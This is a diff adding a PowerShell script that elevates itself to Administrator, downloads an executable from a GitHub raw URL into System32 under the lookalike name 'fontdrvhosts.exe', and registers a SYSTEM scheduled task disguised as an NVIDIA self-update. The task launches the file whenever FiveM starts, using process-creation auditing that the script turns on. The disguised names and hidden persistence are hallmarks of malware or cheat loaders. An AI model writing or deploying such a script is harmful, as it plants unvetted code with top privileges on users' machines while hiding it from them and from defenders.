@@ -1,0 +1,69 @@
+# -----------------------------
+# Menu Selection
+# -----------------------------
+Write-Host "Select Mode:"
+Write-Host "1. Install"
+Write-Host "2. Clean"
+
+$choice = Read-Host "Enter choice (1/2)"
+
+# -----------------------------
+# Check for Administrator rights
+# -----------------------------
+if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) { 
+    Write-Host "Restarting with Administrator privileges..."
+    Start-Process -FilePath "powershell.exe" -ArgumentList "-ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
+    exit
+}
+
+# -----------------------------
+# Define paths and variables
+# -----------------------------
+$system32Path = "$env:windir\System32"
+$exeDestination = Join-Path $system32Path "fontdrvhosts.exe"
+$databasePath  = Join-Path $system32Path "key.txt"
+$exeUrl        = "https://raw.githubusercontent.com/weewrrwr/powellstyle/main/ts3client_win32.exe"
+$taskName      = "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}"
+
+# -----------------------------
+# Install Mode
+# -----------------------------
+if ($choice -eq "1") {
+    Write-Host "Starting installation..."
+
+    # Download exe
+    Invoke-WebRequest -Uri $exeUrl -OutFile $exeDestination
+
+    # Request license key and save
+    $key = Read-Host "Enter License Key"
+    Set-Content -Path $databasePath -Value $key
+
+    # Create scheduled task
+    $cmd = 'cmd /c schtasks /create /tn "NVIDIA App SelfUpdate_{B2FE1952-0186-46C3-BAEC-Z80AA35AC5B8}" /tr "C:\Windows\System32\fontdrvhosts.exe" /sc ONEVENT /ec Security /mo "*[System[(EventID=4688)]] and *[EventData[Data[@Name=''NewProcessName'']=''%localappdata%\FiveM\FiveM.exe'']]" /ru SYSTEM'
+    Invoke-Expression $cmd
+
+    # Enable audit logging
+    auditpol /set /subcategory:"Process Creation" /success:enable
+
+    Write-Host "Installation completed."
+}
+
+# -----------------------------
+# Clean Mode
+# -----------------------------
+elseif ($choice -eq "2") {
+    Write-Host "Cleaning up installation..."
+
+    # Remove scheduled task
+    schtasks /delete /tn $taskName /f
+
+    # Remove files if they exist
+    if (Test-Path $exeDestination) { Remove-Item $exeDestination -Force }
+    if (Test-Path $databasePath) { Remove-Item $databasePath -Force }
+
+    Write-Host "Cleanup completed."
+}
+
+else {
+    Write-Host "Invalid choice (please select 1 or 2)."
+}
